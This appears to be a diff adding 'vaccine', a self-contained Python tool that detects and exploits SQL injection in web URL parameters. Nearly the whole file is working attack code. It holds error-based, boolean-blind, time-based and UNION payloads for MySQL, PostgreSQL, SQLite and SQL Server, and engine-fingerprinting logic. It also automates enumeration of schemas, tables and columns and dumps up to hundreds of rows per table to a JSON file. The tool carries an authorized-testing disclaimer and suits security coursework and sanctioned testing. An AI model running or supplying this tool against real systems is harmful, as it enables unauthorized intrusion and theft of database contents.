@@ -1,0 +1,567 @@
+#!/usr/bin/env python3
+"""
+vaccine - a hand-written SQL injection detection/exploitation tool.
+
+Educational / authorized-testing use only. Only ever point this at a
+URL you own or are explicitly authorized to test (see README.md).
+
+No SQL-injection-automation library is used: every payload, every
+error signature and every extraction query below is written out
+in full. The only non-stdlib-adjacent thing used is urllib, a plain
+HTTP client -- it knows nothing about SQL.
+"""
+import sys
+import os
+import re
+import json
+import time
+import urllib.request
+import urllib.parse
+import urllib.error
+
+# --------------------------------------------------------------------------
+# Constants: payloads, error signatures, engine-specific queries
+# --------------------------------------------------------------------------
+
+DEFAULT_STORE = "vaccine_results.json"
+DEFAULT_USER_AGENT = "vaccine/1.0 (authorized SQLi testing tool)"
+TIMEOUT = 15
+TIME_DELAY_SEC = 5
+SQLITE_SLEEP_ITERS = 55_000_000
+MAX_DUMP_ROWS = 500
+
+# error-based: payloads that tend to break a naive string-concatenated
+# query, paired with regexes that identify which engine complained.
+ERROR_PAYLOADS = ["'", "\"", "')", "\")", "';--", "\";--"]
+
+ERROR_SIGNATURES = {
+    "MySQL": [
+        r"you have an error in your sql syntax",
+        r"warning:\s*mysqli?",
+        r"mysql_fetch_array\(\)",
+        r"unknown column",
+    ],
+    "PostgreSQL": [
+        r"pg_query\(\)",
+        r"postgresql.*?error",
+        r"syntax error at or near",
+        r"unterminated quoted string",
+    ],
+    "SQLite": [
+        r"sqlite3\.(operational|programming)error",
+        r"sqlite_?3?::query",
+        r"unrecognized token",
+        r"near \".*\": syntax error",
+        r"order by term out of range",
+        r"no such (column|table|function)",
+    ],
+    "Microsoft SQL Server": [
+        r"unclosed quotation mark",
+        r"microsoft ole db provider",
+        r"incorrect syntax near",
+        r"sql server.*?driver",
+    ],
+    "Oracle": [
+        r"ora-\d{5}",
+        r"oracle.*?driver",
+    ],
+}
+
+# time-based: engine-specific "sleep" payload. SQLite has no SLEEP(),
+# so a computationally-heavy recursive query stands in for it.
+# Suffixes only -- no leading quote. context_payloads() below prepends
+# either nothing (numeric injection context) or a closing quote
+# (string injection context), since which one applies depends on how
+# the target's query is built and we can't know that in advance.
+TIME_PAYLOADS = {
+    "MySQL": "OR SLEEP({sec})-- -",
+    "PostgreSQL": "OR pg_sleep({sec})-- -",
+    "Microsoft SQL Server": "; WAITFOR DELAY '0:0:{sec}'-- -",
+    "SQLite": "OR (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS "
+              "(SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<{iters}) "
+              "SELECT x FROM r))>0-- -",
+}
+
+# union-based: how each engine reports its version, used both to
+# fingerprint the engine and as a first "does UNION even work" probe.
+UNION_VERSION_EXPR = {
+    "MySQL": "version()",
+    "PostgreSQL": "version()",
+    "SQLite": "sqlite_version()",
+    "Microsoft SQL Server": "@@version",
+}
+
+# information_schema-based engines (MySQL/PostgreSQL share the same
+# shape); SQLite is handled separately via sqlite_master.
+INFOSCHEMA_ENGINES = ("MySQL", "PostgreSQL")
+
+
+# --------------------------------------------------------------------------
+# HTTP
+# --------------------------------------------------------------------------
+
+class HttpResult:
+    def __init__(self, status, body, elapsed, error=None):
+        self.status = status
+        self.body = body
+        self.elapsed = elapsed
+        self.error = error
+
+
+def http_request(url, method, params, injected_param=None, payload=None,
+                  user_agent=DEFAULT_USER_AGENT):
+    """
+    Sends `params` as either the query string (GET) or the body
+    (POST). If `injected_param` is set, that parameter's value is
+    replaced with `payload` for this one request; all others keep
+    their original value from `params`.
+    """
+    effective = dict(params)
+    if injected_param is not None:
+        effective[injected_param] = payload
+    encoded = urllib.parse.urlencode(effective)
+
+    headers = {"User-Agent": user_agent}
+    start = time.monotonic()
+    try:
+        if method == "GET":
+            full_url = url + ("&" if "?" in url else "?") + encoded if encoded else url
+            req = urllib.request.Request(full_url, headers=headers, method="GET")
+            body_bytes = None
+        else:
+            req = urllib.request.Request(
+                url, data=encoded.encode(), headers=headers, method="POST")
+            req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
+            body_bytes = resp.read()
+            status = resp.status
+        elapsed = time.monotonic() - start
+        return HttpResult(status, body_bytes.decode(errors="replace"), elapsed)
+    except urllib.error.HTTPError as e:
+        elapsed = time.monotonic() - start
+        body = e.read().decode(errors="replace") if e.fp else ""
+        return HttpResult(e.code, body, elapsed)
+    except Exception as e:  # noqa: broad -- network/target can fail in any way
+        elapsed = time.monotonic() - start
+        return HttpResult(None, "", elapsed, error=str(e))
+
+
+# --------------------------------------------------------------------------
+# Injection context
+# --------------------------------------------------------------------------
+
+def context_bases(base_value):
+    """
+    We don't know whether the target's query wraps the parameter in
+    quotes (`WHERE name = '<value>'`) or not (`WHERE id = <value>`),
+    so every test that injects a SQL *clause* (as opposed to just a
+    stray quote, which breaks either context) tries both: the bare
+    value (numeric context) and the value followed by a closing quote
+    (string context, `-- -` at the end of the payload comments out the
+    query's own trailing quote).
+    """
+    return [base_value, base_value + "'"]
+
+
+# --------------------------------------------------------------------------
+# Detection: error-based
+# --------------------------------------------------------------------------
+
+def detect_engine_from_text(text):
+    lowered = text.lower()
+    for engine, patterns in ERROR_SIGNATURES.items():
+        for pat in patterns:
+            if re.search(pat, lowered):
+                return engine
+    return None
+
+
+def test_error_based(base_url, method, params, user_agent):
+    findings = []
+    for param in params:
+        for payload in ERROR_PAYLOADS:
+            res = http_request(base_url, method, params, param, payload, user_agent)
+            if res.error or res.status is None:
+                continue
+            engine = detect_engine_from_text(res.body)
+            if engine:
+                findings.append({
+                    "type": "error",
+                    "param": param,
+                    "payload": payload,
+                    "engine": engine,
+                })
+                break  # one confirmed payload per param is enough
+    return findings
+
+
+# --------------------------------------------------------------------------
+# Detection: boolean-based blind
+# --------------------------------------------------------------------------
+
+def test_boolean_based(base_url, method, params, user_agent, baseline):
+    findings = []
+    for param in params:
+        for base in context_bases(params[param]):
+            true_payload = f"{base} AND 1=1-- -"
+            false_payload = f"{base} AND 1=2-- -"
+            res_true = http_request(base_url, method, params, param, true_payload, user_agent)
+            res_false = http_request(base_url, method, params, param, false_payload, user_agent)
+            if res_true.error or res_false.error:
+                continue
+            # vulnerable if TRUE resembles the baseline but FALSE
+            # clearly differs (a naive but effective length heuristic)
+            len_base = len(baseline.body)
+            len_true = len(res_true.body)
+            len_false = len(res_false.body)
+            true_matches_base = abs(len_true - len_base) <= max(5, len_base * 0.02)
+            false_differs = abs(len_false - len_true) > max(5, len_true * 0.02)
+            if true_matches_base and false_differs:
+                findings.append({
+                    "type": "boolean",
+                    "param": param,
+                    "payload": f"{true_payload}  /  {false_payload}",
+                    "engine": None,
+                })
+                break  # one confirmed context per param is enough
+    return findings
+
+
+# --------------------------------------------------------------------------
+# Detection: time-based blind
+# --------------------------------------------------------------------------
+
+def test_time_based(base_url, method, params, user_agent, baseline_elapsed):
+    findings = []
+    for param in params:
+        found = False
+        for engine, suffix in TIME_PAYLOADS.items():
+            if found:
+                break
+            filled = (suffix.format(iters=SQLITE_SLEEP_ITERS) if "{iters}" in suffix
+                      else suffix.format(sec=TIME_DELAY_SEC))
+            for base in context_bases(params[param]):
+                payload = f"{base} {filled}"
+                res = http_request(base_url, method, params, param, payload, user_agent)
+                if res.error:
+                    continue
+                if res.elapsed - baseline_elapsed >= TIME_DELAY_SEC - 1.5:
+                    findings.append({
+                        "type": "time",
+                        "param": param,
+                        "payload": payload,
+                        "engine": engine,
+                        "delay_observed": round(res.elapsed, 2),
+                    })
+                    found = True
+                    break  # one confirmed engine/context per param is enough
+    return findings
+
+
+# --------------------------------------------------------------------------
+# Detection + exploitation: UNION-based
+# --------------------------------------------------------------------------
+
+def _find_union_columns(base_url, method, params, user_agent, param, base, max_columns):
+    """ORDER BY N probing: the first N that errors out means the real
+    query has N-1 columns. Returns None if every probe up to
+    max_columns succeeded without erroring (can't tell)."""
+    for n in range(1, max_columns + 1):
+        payload = f"{base} ORDER BY {n}-- -"
+        res = http_request(base_url, method, params, param, payload, user_agent)
+        if res.error:
+            return None
+        if detect_engine_from_text(res.body):
+            return n - 1
+    return max_columns
+
+
+def find_union_point(base_url, method, params, user_agent, max_columns=12):
+    """
+    For each parameter and each injection context (numeric / quoted
+    string), tries to find the column count (via ORDER BY probing)
+    and which of those columns gets echoed back into the response
+    body (via a unique marker string), which is what makes UNION-based
+    extraction possible.
+    Returns a dict {param, base, columns, reflected_index, engine} or None.
+    """
+    marker = "vaccine_marker_7f3c9a"
+    for param in params:
+        for base in context_bases(params[param]):
+            columns = _find_union_columns(base_url, method, params, user_agent,
+                                           param, base, max_columns)
+            if not columns:
+                continue
+
+            for idx in range(columns):
+                select_list = ["NULL"] * columns
+                select_list[idx] = f"'{marker}'"
+                payload = f"{base} UNION SELECT {','.join(select_list)}-- -"
+                res = http_request(base_url, method, params, param, payload, user_agent)
+                if res.error or marker not in res.body:
+                    continue
+                engine = None
+                for eng, expr in UNION_VERSION_EXPR.items():
+                    select_list2 = ["NULL"] * columns
+                    select_list2[idx] = expr
+                    payload2 = f"{base} UNION SELECT {','.join(select_list2)}-- -"
+                    res2 = http_request(base_url, method, params, param, payload2, user_agent)
+                    if not res2.error and res2.status and not detect_engine_from_text(res2.body):
+                        engine = eng
+                        break
+                return {
+                    "param": param,
+                    "base": base,
+                    "columns": columns,
+                    "reflected_index": idx,
+                    "engine": engine,
+                }
+    return None
+
+
+def union_select_value(base_url, method, params, user_agent, point, expr):
+    """Runs one UNION SELECT with `expr` in the reflected column and
+    returns the extracted string (or None if nothing came back)."""
+    base_value = point["base"]
+    select_list = ["NULL"] * point["columns"]
+    select_list[point["reflected_index"]] = expr
+    payload = f"{base_value} UNION SELECT {','.join(select_list)}-- -"
+    res = http_request(base_url, method, params, point["param"], payload, user_agent)
+    if res.error:
+        return None
+    return res.body
+
+
+def _extract_rows(base_url, method, params, user_agent, point, expr_tmpl, max_rows):
+    """expr_tmpl gets .format(n=offset) applied; stops at first empty result."""
+    rows = []
+    for n in range(max_rows):
+        body = union_select_value(base_url, method, params, user_agent, point,
+                                   expr_tmpl.format(n=n))
+        if body is None:
+            break
+        m = re.search(r"VACCROWSTART(.*?)VACCROWEND", body, re.S)
+        if not m or m.group(1) == "":
+            break
+        rows.append(m.group(1))
+    return rows
+
+
+def _wrap(expr):
+    """Wraps an extracted value with easy-to-find sentinels so we can
+    pull it out of arbitrary surrounding HTML reliably."""
+    return "'VACCROWSTART' || (" + expr + ") || 'VACCROWEND'"
+
+
+def get_databases(base_url, method, params, user_agent, point):
+    if point["engine"] == "SQLite":
+        return ["main"]
+    if point["engine"] in INFOSCHEMA_ENGINES:
+        tmpl = _wrap("SELECT schema_name FROM information_schema.schemata "
+                      "LIMIT 1 OFFSET {n}")
+        return _extract_rows(base_url, method, params, user_agent, point, tmpl, MAX_DUMP_ROWS)
+    return []
+
+
+def get_tables(base_url, method, params, user_agent, point, database):
+    if point["engine"] == "SQLite":
+        tmpl = _wrap("SELECT name FROM sqlite_master WHERE type='table' "
+                      "LIMIT 1 OFFSET {n}")
+    elif point["engine"] in INFOSCHEMA_ENGINES:
+        tmpl = _wrap(f"SELECT table_name FROM information_schema.tables "
+                      f"WHERE table_schema='{database}' LIMIT 1 OFFSET {{n}}")
+    else:
+        return []
+    return _extract_rows(base_url, method, params, user_agent, point, tmpl, MAX_DUMP_ROWS)
+
+
+def get_columns(base_url, method, params, user_agent, point, database, table):
+    if point["engine"] == "SQLite":
+        body = union_select_value(base_url, method, params, user_agent, point,
+            _wrap(f"SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'"))
+        m = re.search(r"VACCROWSTART(.*?)VACCROWEND", body or "", re.S)
+        if not m:
+            return []
+        inner = re.search(r"\((.*)\)", m.group(1), re.S)
+        if not inner:
+            return []
+        cols = []
+        for part in inner.group(1).split(","):
+            name = part.strip().split()[0].strip('"[]`')
+            if name:
+                cols.append(name)
+        return cols
+    if point["engine"] in INFOSCHEMA_ENGINES:
+        tmpl = _wrap(f"SELECT column_name FROM information_schema.columns "
+                      f"WHERE table_schema='{database}' AND table_name='{table}' "
+                      f"LIMIT 1 OFFSET {{n}}")
+        return _extract_rows(base_url, method, params, user_agent, point, tmpl, MAX_DUMP_ROWS)
+    return []
+
+
+def dump_table(base_url, method, params, user_agent, point, table, columns):
+    concat = " || '\x1f' || ".join(f"COALESCE({c},'')" for c in columns) if columns else "'?'"
+    tmpl = _wrap(f"SELECT {concat} FROM {table} LIMIT 1 OFFSET {{n}}")
+    rows = _extract_rows(base_url, method, params, user_agent, point, tmpl, MAX_DUMP_ROWS)
+    return [dict(zip(columns, r.split("\x1f"))) for r in rows]
+
+
+# --------------------------------------------------------------------------
+# Storage
+# --------------------------------------------------------------------------
+
+def load_store(path):
+    if not os.path.exists(path):
+        return {"scans": []}
+    try:
+        with open(path) as f:
+            return json.load(f)
+    except (json.JSONDecodeError, OSError):
+        return {"scans": []}
+
+
+def save_store(path, store):
+    with open(path, "w") as f:
+        json.dump(store, f, indent=2)
+
+
+# --------------------------------------------------------------------------
+# CLI
+# --------------------------------------------------------------------------
+
+def print_usage(prog):
+    print(f"""Usage: {prog} [-o FILE] [-X METHOD] [-A USER-AGENT] URL
+
+  -o FILE         results storage file (default: {DEFAULT_STORE})
+  -X METHOD       GET or POST (default: GET)
+  -A USER-AGENT   override the User-Agent header (bonus)
+  -h, --help      show this help
+
+URL's query string parameters are the ones tested. With -X POST, the
+same parameters are sent as the POST body instead of the query string.
+
+Example:
+  {prog} "http://127.0.0.1:8000/products?id=1"
+  {prog} -X POST -o results.json "http://127.0.0.1:8000/products?id=1"
+""")
+
+
+def parse_args(argv):
+    opts = {"store": DEFAULT_STORE, "method": "GET", "user_agent": DEFAULT_USER_AGENT}
+    url = None
+    i = 0
+    while i < len(argv):
+        arg = argv[i]
+        if arg in ("-h", "--help"):
+            return None, opts
+        elif arg == "-o":
+            i += 1
+            opts["store"] = argv[i]
+        elif arg == "-X":
+            i += 1
+            method = argv[i].upper()
+            if method not in ("GET", "POST"):
+                print(f"vaccine: error: unsupported method '{argv[i]}' (use GET or POST)",
+                      file=sys.stderr)
+                sys.exit(1)
+            opts["method"] = method
+        elif arg == "-A":
+            i += 1
+            opts["user_agent"] = argv[i]
+        elif arg.startswith("-") and arg != "-":
+            print(f"vaccine: error: unknown option '{arg}'", file=sys.stderr)
+            sys.exit(1)
+        else:
+            url = arg
+        i += 1
+    return url, opts
+
+
+def main():
+    prog = os.path.basename(sys.argv[0])
+    url, opts = parse_args(sys.argv[1:])
+    if url is None:
+        print_usage(prog)
+        return 0 if "-h" in sys.argv or "--help" in sys.argv else 1
+
+    parsed = urllib.parse.urlparse(url)
+    if parsed.scheme not in ("http", "https") or not parsed.netloc:
+        print(f"vaccine: error: '{url}' is not a valid http(s) URL", file=sys.stderr)
+        return 1
+    query_params = {k: v[0] for k, v in urllib.parse.parse_qs(
+        parsed.query, keep_blank_values=True).items()}
+    if not query_params:
+        print("vaccine: error: URL has no query-string parameters to test "
+              "(e.g. 'http://host/path?id=1')", file=sys.stderr)
+        return 1
+
+    # base_url never keeps the original query string: http_request()
+    # rebuilds it entirely from `query_params` (with one value swapped
+    # for the current payload), for both GET and POST.
+    base_url = url.split("?")[0]
+    method = opts["method"]
+    user_agent = opts["user_agent"]
+
+    print(f"vaccine: target {base_url}  method={method}  params={list(query_params)}")
+    print("vaccine: you are responsible for only testing authorized targets.\n")
+
+    baseline = http_request(base_url, method, query_params, user_agent=user_agent)
+    if baseline.error:
+        print(f"vaccine: error: could not reach target: {baseline.error}", file=sys.stderr)
+        return 1
+
+    findings = []
+    print("[*] running error-based tests...")
+    findings += test_error_based(base_url, method, query_params, user_agent)
+    print("[*] running boolean-based blind tests...")
+    findings += test_boolean_based(base_url, method, query_params, user_agent, baseline)
+    print("[*] running time-based blind tests...")
+    findings += test_time_based(base_url, method, query_params, user_agent, baseline.elapsed)
+
+    union_point = None
+    if findings:
+        print("[*] running UNION-based tests (for extraction)...")
+        union_point = find_union_point(base_url, method, query_params, user_agent)
+
+    if not findings:
+        print("\n[-] No SQL injection found on the tested parameter(s).")
+    else:
+        print(f"\n[!] {len(findings)} injection finding(s):")
+        for f in findings:
+            engine = f.get("engine") or "unknown"
+            print(f"    - param='{f['param']}' type={f['type']} engine={engine}")
+            print(f"      payload: {f['payload']}")
+
+    extraction = None
+    if union_point and union_point.get("engine"):
+        print(f"\n[*] UNION extraction point found on '{union_point['param']}' "
+              f"({union_point['columns']} columns, engine={union_point['engine']})")
+        databases = get_databases(base_url, method, query_params, user_agent, union_point)
+        print(f"[*] databases: {databases}")
+        extraction = {"union_point": union_point, "databases": {}}
+        for db in databases[:3]:
+            tables = get_tables(base_url, method, query_params, user_agent, union_point, db)
+            print(f"[*] {db}: tables: {tables}")
+            extraction["databases"][db] = {}
+            for table in tables[:5]:
+                cols = get_columns(base_url, method, query_params, user_agent, union_point, db, table)
+                print(f"    - {table}: columns: {cols}")
+                rows = dump_table(base_url, method, query_params, user_agent, union_point, table, cols)
+                extraction["databases"][db][table] = {"columns": cols, "rows": rows}
+
+    store = load_store(opts["store"])
+    store["scans"].append({
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
+        "url": url,
+        "method": method,
+        "params_tested": list(query_params),
+        "findings": findings,
+        "extraction": extraction,
+    })
+    save_store(opts["store"], store)
+    print(f"\n[*] results saved to {opts['store']}")
+    return 0 if findings else 2
+
+
+if __name__ == "__main__":
+    sys.exit(main())
